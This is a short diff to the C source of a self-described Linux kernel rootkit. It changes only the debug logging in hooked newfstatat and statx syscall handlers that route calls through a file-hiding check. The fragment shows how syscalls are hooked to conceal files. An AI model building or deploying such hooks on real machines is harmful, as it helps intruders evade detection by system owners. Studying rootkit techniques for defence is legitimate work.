@@ -29,7 +29,8 @@ SYSCALL_HOOK_HANDLER2(lstat, orig_lstat, p_regs, const char __user *, s_filename
 SYSCALL_HOOK_HANDLER4(newfstatat, orig_newfstatat, p_regs, int, i32_dfd, const char __user *,
                       s_filename, struct stat __user *, p_statbuf, int, i32_flag)
 {
-    pr_info("[ROOTKIT] newfstatat(%d, %p, %p, %d)\n", i32_dfd, s_filename, p_statbuf, i32_flag);
+    pr_info("[ROOTKIT] newfstatat(%d, %p, %p, %s%#x)\n", i32_dfd, s_filename, p_statbuf,
+            SIGNED_ARG(i32_flag));
 
     return do_check_hidden(orig_newfstatat, p_regs, i32_dfd, s_filename, i32_flag);
 }
@@ -39,7 +40,7 @@ SYSCALL_HOOK_HANDLER5(statx, orig_statx, p_regs, int, i32_dfd, const char __user
                       unsigned int, ui32_flags, unsigned int, ui32_mask, struct statx __user *,
                       p_buffer)
 {
-    pr_info("[ROOTKIT] statx(%d, %p, %u, %u, %p)\n", i32_dfd, s_filename, ui32_flags, ui32_mask,
+    pr_info("[ROOTKIT] statx(%d, %p, %#x, %#x, %p)\n", i32_dfd, s_filename, ui32_flags, ui32_mask,
             p_buffer);
 
     return do_check_hidden(orig_statx, p_regs, i32_dfd, s_filename, ui32_flags);
